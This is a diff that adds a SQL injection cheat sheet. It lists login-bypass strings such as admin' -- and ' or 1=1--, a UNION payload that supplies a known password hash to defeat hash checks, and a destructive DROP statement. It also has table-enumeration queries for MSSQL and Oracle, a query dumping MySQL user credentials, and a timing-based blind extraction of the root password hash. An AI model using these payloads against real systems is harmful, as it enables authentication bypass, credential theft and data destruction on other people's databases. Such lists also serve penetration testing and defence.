@@ -1,0 +1,35 @@
+SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
+SELECT /*!32302 1/0, */ 1 FROM tablename
+SELECT * FROM members; DROP members--
+(MYSQL)SELECT IF(1=1,'true','false')
+(SQL)IF (1=1) SELECT 'true' ELSE SELECT 'false'
+(ORACLE)IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;
+SELECT login + '-' + password FROM members
+SELECT login || '-' || password FROM members
+SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members
+
+LOGIN SHORTCUTS
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+BYPASSING HASH
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
+
+FINDING STRUCTURE
+SELECT name FROM sysobjects WHERE xtype = 'U'
+
+FINDING STRUCTURE (ORACLE)
+SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'
+
+CHECK IF TABLE EXISTS
+IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))
+
+MYSQL
+SELECT User,Password FROM mysql.user;
+SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = 'root';
